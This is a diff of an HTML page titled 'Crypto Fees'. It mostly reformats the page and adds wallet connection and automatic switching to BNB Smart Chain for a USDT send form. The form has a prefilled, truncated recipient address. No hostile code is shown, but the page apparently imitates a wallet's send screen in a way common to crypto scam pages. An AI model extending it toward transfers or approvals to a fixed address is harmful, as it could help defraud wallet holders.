@@ -2,20 +2,33 @@
 <html>
 <head>
   <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <meta
+    name="viewport"
+    content="width=device-width,initial-scale=1"
+  />
+
   <title>Crypto Fees</title>
 
   <style>
-    * { box-sizing: border-box; }
+    * {
+      box-sizing: border-box;
+    }
 
-    html, body {
+    html,
+    body {
       margin: 0;
       width: 100%;
       min-height: 100%;
       background: #000;
       color: #f1f1f1;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
-        Helvetica, Arial, sans-serif;
+      font-family:
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Roboto,
+        Helvetica,
+        Arial,
+        sans-serif;
     }
 
     body {
@@ -53,7 +66,8 @@
       display: flex;
       align-items: center;
       padding: 0 14px 0 21px;
-      box-shadow: inset 0 0 0 1px rgba(255,255,255,.025);
+      box-shadow:
+        inset 0 0 0 1px rgba(255,255,255,.025);
     }
 
     .address {
@@ -162,14 +176,11 @@
       font-weight: 600;
       font-family: inherit;
       cursor: pointer;
-    }
-
-    .next:active {
-      transform: scale(.99);
+      transition: opacity .15s ease;
     }
 
     .next:disabled {
-      opacity: .65;
+      opacity: .6;
       cursor: wait;
     }
 
@@ -197,36 +208,96 @@
 
 <main class="page">
 
-  <label class="label">Address or Domain Name</label>
+  <label class="label">
+    Address or Domain Name
+  </label>
 
   <div class="field">
+
     <div class="address" id="address">
       0x669BC24729E5EcA11f00C
     </div>
 
     <div class="actions">
 
-      <button class="paste" id="pasteBtn" type="button">
+      <button
+        class="paste"
+        id="pasteBtn"
+        type="button"
+      >
         Paste
       </button>
 
       <!-- Clipboard icon -->
-      <svg class="icon" viewBox="0 0 24 24" aria-hidden="true">
-        <rect x="7" y="5" width="13" height="15" rx="2" fill="#49d28d"/>
-        <rect x="4" y="2" width="13" height="15" rx="2" fill="#49d28d"/>
-        <rect x="7" y="5" width="10" height="11" rx="1.2" fill="#000"/>
-        <rect x="9" y="7" width="6" height="1.7" rx=".8" fill="#49d28d"/>
-        <rect x="9" y="10" width="5" height="1.7" rx=".8" fill="#49d28d"/>
+      <svg
+        class="icon"
+        viewBox="0 0 24 24"
+        aria-hidden="true"
+      >
+        <rect
+          x="7"
+          y="5"
+          width="13"
+          height="15"
+          rx="2"
+          fill="#49d28d"
+        />
+
+        <rect
+          x="4"
+          y="2"
+          width="13"
+          height="15"
+          rx="2"
+          fill="#49d28d"
+        />
+
+        <rect
+          x="7"
+          y="5"
+          width="10"
+          height="11"
+          rx="1.2"
+          fill="#000"
+        />
+
+        <rect
+          x="9"
+          y="7"
+          width="6"
+          height="1.7"
+          rx=".8"
+          fill="#49d28d"
+        />
+
+        <rect
+          x="9"
+          y="10"
+          width="5"
+          height="1.7"
+          rx=".8"
+          fill="#49d28d"
+        />
       </svg>
 
       <!-- QR icon -->
-      <svg class="icon" viewBox="0 0 24 24" aria-hidden="true">
+      <svg
+        class="icon"
+        viewBox="0 0 24 24"
+        aria-hidden="true"
+      >
         <path
-          d="M3 3h7v7H3zM5 5v3h3V5zM14 3h7v7h-7zM16 5v3h3V5zM3 14h7v7H3zM5 16v3h3v-3z"
+          d="M3 3h7v7H3zM5 5v3h3V5z
+             M14 3h7v7h-7zM16 5v3h3V5z
+             M3 14h7v7H3zM5 16v3h3v-3z"
           fill="#49d28d"
         />
+
         <path
-          d="M14 14h3v3h-3zM18 14h3v3h-3zM14 18h3v3h-3zM18 18h3v3h-3z"
+          d="M14 14h3v3h-3z
+             M18 14h3v3h-3z
+             M14 18h3v3h-3z
+             M18 18h3v3h-3z"
           fill="#49d28d"
         />
       </svg>
@@ -237,7 +308,9 @@
 
   <section class="section">
 
-    <label class="label">Amount</label>
+    <label class="label">
+      Amount
+    </label>
 
     <div class="field amount-field">
 
@@ -249,17 +322,25 @@
         autocomplete="off"
         placeholder="USDT Amount"
         aria-label="USDT Amount"
+      />
+
+      <span class="currency">
+        USDT
+      </span>
+
+      <span
+        class="max"
+        id="maxBtn"
       >
-
-      <span class="currency">USDT</span>
-
-      <span class="max" id="maxBtn">
         Max
       </span>
 
     </div>
 
-    <div class="usd" id="usdValue">
+    <div
+      class="usd"
+      id="usdValue"
+    >
       ≈ $0.00
     </div>
 
@@ -283,244 +364,419 @@
 
 <script>
 
-  const amount = document.getElementById('amount');
-  const usdValue = document.getElementById('usdValue');
-  const pasteBtn = document.getElementById('pasteBtn');
-  const address = document.getElementById('address');
-  const maxBtn = document.getElementById('maxBtn');
-  const nextBtn = document.getElementById('nextBtn');
+  const amount =
+    document.getElementById('amount');
+
+  const usdValue =
+    document.getElementById('usdValue');
+
+  const pasteBtn =
+    document.getElementById('pasteBtn');
+
+  const address =
+    document.getElementById('address');
+
+  const maxBtn =
+    document.getElementById('maxBtn');
+
+  const nextBtn =
+    document.getElementById('nextBtn');
 
 
-  // -----------------------------------------
-  // USD VALUE
-  // -----------------------------------------
+  /*
+   * -----------------------------------------
+   * USD VALUE
+   * -----------------------------------------
+   */
 
   function updateUsd() {
 
-    const raw = amount.value
-      .replace(/,/g, '')
-      .trim();
+    const raw =
+      amount.value
+        .replace(/,/g, '')
+        .trim();
 
     const n = Number(raw);
 
-    if (!raw || !Number.isFinite(n)) {
-      usdValue.textContent = '≈ $0.00';
+    if (
+      !raw ||
+      !Number.isFinite(n)
+    ) {
+      usdValue.textContent =
+        '≈ $0.00';
+
       return;
     }
 
     usdValue.textContent =
       '≈ $' +
-      n.toLocaleString('en-US', {
-        minimumFractionDigits: 2,
-        maximumFractionDigits: 2
-      });
-
+      n.toLocaleString(
+        'en-US',
+        {
+          minimumFractionDigits: 2,
+          maximumFractionDigits: 2
+        }
+      );
   }
 
 
-  // -----------------------------------------
-  // AMOUNT INPUT
-  // -----------------------------------------
+  /*
+   * -----------------------------------------
+   * AMOUNT
+   * -----------------------------------------
+   */
 
-  amount.addEventListener('input', () => {
+  amount.addEventListener(
+    'input',
+    () => {
 
-    let value = amount.value.replace(/[^\d.]/g, '');
+      let value =
+        amount.value
+          .replace(/[^\d.]/g, '');
 
-    const parts = value.split('.');
+      const parts =
+        value.split('.');
 
-    if (parts.length > 2) {
-      value =
-        parts[0] +
-        '.' +
-        parts.slice(1).join('');
+      if (parts.length > 2) {
+
+        value =
+          parts[0] +
+          '.' +
+          parts
+            .slice(1)
+            .join('');
+      }
+
+      amount.value = value;
+
+      updateUsd();
+    }
+  );
+
+
+  /*
+   * -----------------------------------------
+   * PASTE
+   * -----------------------------------------
+   */
+
+  pasteBtn.addEventListener(
+    'click',
+    async () => {
+
+      try {
+
+        const text =
+          await navigator
+            .clipboard
+            .readText();
+
+        if (text) {
+          address.textContent = text;
+        }
+
+      } catch (error) {
+
+        console.error(
+          'Clipboard error:',
+          error
+        );
+      }
+    }
+  );
+
+
+  /*
+   * -----------------------------------------
+   * MAX
+   * -----------------------------------------
+   */
+
+  maxBtn.addEventListener(
+    'click',
+    () => {
+
+      amount.focus();
+
+    }
+  );
+
+
+  /*
+   * -----------------------------------------
+   * FIND WALLET PROVIDER
+   * -----------------------------------------
+   *
+   * Trust Wallet and MetaMask browsers
+   * normally expose an EIP-1193 provider.
+   *
+   * This page does NOT use Reown/AppKit.
+   */
+
+  function getWalletProvider() {
+
+    /*
+     * Normal injected provider.
+     */
+
+    if (window.ethereum) {
+      return window.ethereum;
     }
 
-    amount.value = value;
-
-    updateUsd();
-
-  });
+    return null;
+  }
 
 
-  // -----------------------------------------
-  // PASTE
-  // -----------------------------------------
+  /*
+   * -----------------------------------------
+   * CONNECT WALLET
+   * -----------------------------------------
+   */
 
-  pasteBtn.addEventListener('click', async () => {
+  nextBtn.addEventListener(
+    'click',
+    async () => {
 
-    try {
+      try {
 
-      const text =
-        await navigator.clipboard.readText();
+        nextBtn.disabled = true;
 
-      if (text) {
-        address.textContent = text;
-      }
-
-    } catch (error) {
-
-      console.error(
-        'Clipboard access failed:',
-        error
-      );
-
-    }
-
-  });
+        nextBtn.textContent =
+          'Connecting...';
 
 
-  // -----------------------------------------
-  // MAX
-  // -----------------------------------------
+        /*
+         * Find Trust Wallet / MetaMask
+         * injected provider.
+         */
 
-  maxBtn.addEventListener('click', () => {
-
-    amount.focus();
-
-  });
+        const provider =
+          getWalletProvider();
 
 
-  // -----------------------------------------
-  // WALLET CONNECTION
-  //
-  // This is intentionally ONLY for wallets
-  // that inject window.ethereum.
-  //
-  // No Reown/AppKit fallback.
-  // -----------------------------------------
+        if (!provider) {
 
-  nextBtn.addEventListener('click', async () => {
+          throw new Error(
+            'Wallet provider not detected. Please open this page inside Trust Wallet or MetaMask.'
+          );
+        }
 
-    try {
 
-      // Make sure the page is running inside
-      // Trust Wallet / MetaMask or another
-      // injected-wallet browser.
-
-      if (!window.ethereum) {
-
-        alert(
-          'Please open this page inside Trust Wallet or MetaMask.'
+        console.log(
+          'Wallet provider detected:',
+          provider
         );
 
-        return;
-      }
+
+        /*
+         * Request connection.
+         *
+         * This should trigger the wallet's
+         * native connection confirmation.
+         */
+
+        const accounts =
+          await provider.request({
+            method:
+              'eth_requestAccounts'
+          });
 
 
-      // Prevent double-clicks.
+        if (
+          !accounts ||
+          accounts.length === 0
+        ) {
 
-      nextBtn.disabled = true;
-
-
-      // Request wallet connection.
-      //
-      // Trust Wallet / MetaMask should display
-      // its own connection confirmation.
-
-      const accounts =
-        await window.ethereum.request({
-          method: 'eth_requestAccounts'
-        });
+          throw new Error(
+            'No wallet account returned.'
+          );
+        }
 
 
-      if (!accounts || accounts.length === 0) {
+        const walletAddress =
+          accounts[0];
 
-        throw new Error(
-          'No wallet account was returned.'
+
+        console.log(
+          'Connected wallet:',
+          walletAddress
         );
 
-      }
+
+        /*
+         * -----------------------------------
+         * CHECK NETWORK
+         * -----------------------------------
+         *
+         * BSC Mainnet = 0x38
+         */
+
+        let chainId =
+          await provider.request({
+            method: 'eth_chainId'
+          });
 
 
-      const walletAddress = accounts[0];
-
-      console.log(
-        'Wallet connected:',
-        walletAddress
-      );
-
-
-      // -----------------------------------------
-      // OPTIONAL:
-      // Check BSC network.
-      // BSC Mainnet = 0x38
-      // -----------------------------------------
-
-      const chainId =
-        await window.ethereum.request({
-          method: 'eth_chainId'
-        });
-
-
-      console.log(
-        'Connected chain:',
-        chainId
-      );
-
-
-      if (chainId.toLowerCase() !== '0x38') {
-
-        alert(
-          'Please switch your wallet to BNB Smart Chain (BSC).'
+        console.log(
+          'Current chain:',
+          chainId
         );
+
+
+        /*
+         * If not BSC, request wallet
+         * to switch to BSC.
+         */
+
+        if (
+          chainId.toLowerCase() !==
+          '0x38'
+        ) {
+
+          try {
+
+            await provider.request({
+              method:
+                'wallet_switchEthereumChain',
+
+              params: [
+                {
+                  chainId: '0x38'
+                }
+              ]
+            });
+
+          } catch (switchError) {
+
+            /*
+             * Some wallets may reject
+             * automatic network switching.
+             */
+
+            console.error(
+              'Network switch failed:',
+              switchError
+            );
+
+            alert(
+              'Please switch your wallet to BNB Smart Chain (BSC).'
+            );
+
+            nextBtn.disabled = false;
+
+            nextBtn.textContent =
+              'Next';
+
+            return;
+          }
+
+
+          /*
+           * Get the new chain ID after
+           * switching.
+           */
+
+          chainId =
+            await provider.request({
+              method:
+                'eth_chainId'
+            });
+        }
+
+
+        /*
+         * Make sure we're actually on BSC.
+         */
+
+        if (
+          chainId.toLowerCase() !==
+          '0x38'
+        ) {
+
+          throw new Error(
+            'Wallet is not connected to BNB Smart Chain.'
+          );
+        }
+
+
+        /*
+         * -----------------------------------
+         * SUCCESS
+         * -----------------------------------
+         */
+
+        console.log(
+          'BSC wallet connected:',
+          walletAddress
+        );
+
+
+        /*
+         * Save the connected address for
+         * the next page if needed.
+         *
+         * This is NOT a secret/private key.
+         */
+
+        sessionStorage.setItem(
+          'connectedWallet',
+          walletAddress
+        );
+
+
+        /*
+         * Example:
+         *
+         * window.location.href =
+         *   '/confirm.html';
+         *
+         * Uncomment when your next page
+         * is ready.
+         */
+
+
+        nextBtn.textContent =
+          'Connected';
+
+
+      } catch (error) {
+
+        console.error(
+          'Wallet connection error:',
+          error
+        );
+
+
+        /*
+         * User rejected the connection.
+         */
+
+        if (
+          error &&
+          error.code === 4001
+        ) {
+
+          alert(
+            'Wallet connection was rejected.'
+          );
+
+        } else {
+
+          alert(
+            error?.message ||
+            'Unable to connect to wallet.'
+          );
+        }
+
 
         nextBtn.disabled = false;
 
-        return;
+        nextBtn.textContent =
+          'Next';
       }
-
-
-      // -----------------------------------------
-      // WALLET IS CONNECTED
-      // -----------------------------------------
-
-      console.log(
-        'Connected BSC wallet:',
-        walletAddress
-      );
-
-
-      /*
-       * Put your next-page/navigation logic here.
-       *
-       * Example:
-       *
-       * window.location.href = '/confirm.html';
-       *
-       */
-
-
-    } catch (error) {
-
-      console.error(
-        'Wallet connection error:',
-        error
-      );
-
-
-      // User rejected the wallet connection.
-
-      if (error && error.code === 4001) {
-
-        console.log(
-          'User rejected the wallet connection.'
-        );
-
-      } else {
-
-        alert(
-          'Unable to connect to the wallet.'
-        );
-
-      }
-
-    } finally {
-
-      nextBtn.disabled = false;
 
     }
-
-  });
+  );
 
 </script>
 
